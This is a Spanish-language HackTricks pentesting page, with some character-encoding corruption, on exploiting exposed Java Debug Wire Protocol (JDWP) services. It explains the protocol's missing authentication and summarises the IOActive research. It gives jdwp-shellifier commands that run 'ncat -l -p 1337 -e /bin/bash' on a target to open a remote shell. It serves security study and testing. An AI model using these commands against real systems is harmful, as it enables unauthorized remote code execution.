# Pentesting JDWP - Protocolo de cable de depuraci贸n Java

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n la [**oficial mercanc铆a de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Explotaci贸n

La explotaci贸n de JDWP se basa en la **falta de autenticaci贸n y cifrado del protocolo**. Generalmente se encuentra en el **puerto 8000**, pero tambi茅n es posible en otros puertos. La conexi贸n inicial se realiza enviando un "Saludo JDWP" al puerto de destino. Si un servicio JDWP est谩 activo, responde con la misma cadena, confirmando su presencia. Este saludo act煤a como un m茅todo de fingerprinting para identificar servicios JDWP en la red.

En cuanto a la identificaci贸n de procesos, buscar la cadena "jdwk" en los procesos de Java puede indicar una sesi贸n JDWP activa.

La herramienta principal es [jdwp-shellifier](https://github.com/hugsy/jdwp-shellifier). Puedes usarla con diferentes par谩metros:
```bash
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 #Obtain internal data
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --cmd 'ncat -l -p 1337 -e /bin/bash' #Exec something
./jdwp-shellifier.py -t 192.168.2.9 -p 8000 --break-on 'java.lang.String.indexOf' --cmd 'ncat -l -p 1337 -e /bin/bash' #Uses java.lang.String.indexOf as breakpoint instead of java.net.ServerSocket.accept
```
Encontr茅 que el uso de `--break-on 'java.lang.String.indexOf'` hace que el exploit sea m谩s **estable**. Y si tienes la oportunidad de cargar un backdoor en el host y ejecutarlo en lugar de ejecutar un comando, el exploit ser谩 a煤n m谩s estable.

## M谩s detalles

**Este es un resumen de [https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)**. Consulta para m谩s detalles.

1. **Visi贸n general de JDWP**:
- Es un protocolo binario de red basado en paquetes, principalmente s铆ncrono.
- Carece de autenticaci贸n y cifrado, lo que lo hace vulnerable cuando se expone a redes hostiles.

2. **Handshake de JDWP**:
- Se utiliza un proceso de handshake simple para iniciar la comunicaci贸n. Se intercambia una cadena ASCII de 14 caracteres "JDWP-Handshake" entre el Depurador (cliente) y el Depurado (servidor).

3. **Comunicaci贸n de JDWP**:
- Los mensajes tienen una estructura simple con campos como Longitud, Id, Bandera y Conjunto de Comandos.
- Los valores del Conjunto de Comandos van desde 0x40 hasta 0x80, representando diferentes acciones y eventos.

4. **Explotaci贸n**:
- JDWP permite cargar e invocar clases y bytes de c贸digo arbitrarios, lo que plantea riesgos de seguridad.
- El art铆culo detalla un proceso de explotaci贸n en cinco pasos, que implica obtener referencias de tiempo de ejecuci贸n de Java, establecer puntos de interrupci贸n e invocar m茅todos.

5. **Explotaci贸n en la vida real**:
- A pesar de las posibles protecciones de firewall, los servicios de JDWP son descubribles y explotables en escenarios del mundo real, como se demuestra en b煤squedas en plataformas como ShodanHQ y GitHub.
- El script de exploit se prob贸 contra varias versiones de JDK y es independiente de la plataforma, ofreciendo una Ejecuci贸n Remota de C贸digo (RCE) confiable.

6. **Implicaciones de seguridad**:
- La presencia de servicios JDWP abiertos en Internet subraya la necesidad de revisiones de seguridad regulares, deshabilitar funcionalidades de depuraci贸n en producci贸n y configuraciones adecuadas de firewall.


### **Referencias:**

* [[https://ioactive.com/hacking-java-debug-wire-protocol-or-how/](https://ioactive.com/hacking-java-debug-wire-protocol-or-how/)]
* [https://github.com/IOActive/jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)
* [http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html](http://docs.oracle.com/javase/7/docs/technotes/guides/jpda/architecture.html)
* http://www.secdev.org/projects/scapy(no longer active)
* [http://www.shodanhq.com/search?q=JDWP-HANDSHAKE](http://www.shodanhq.com/search?q=JDWP-HANDSHAKE)
* http://www.hsc-news.com/archives/2013/000109.html (no longer active)
* [http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt](http://packetstormsecurity.com/files/download/122525/JDWP-exploitation.txt)
* https://github.com/search?q=-Xdebug+-Xrunjdwp\&type=Code\&ref=searchresults
* [http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html](http://docs.oracle.com/javase/6/docs/api/java/lang/Runtime.html)
* [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html](http://docs.oracle.com)
* [http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html](http://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp/jdwp-protocol.html)
* [http://nmap.org/nsedoc/scripts/jdwp-exec.html](http://nmap.org/nsedoc/scripts/jdwp-exec.html)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
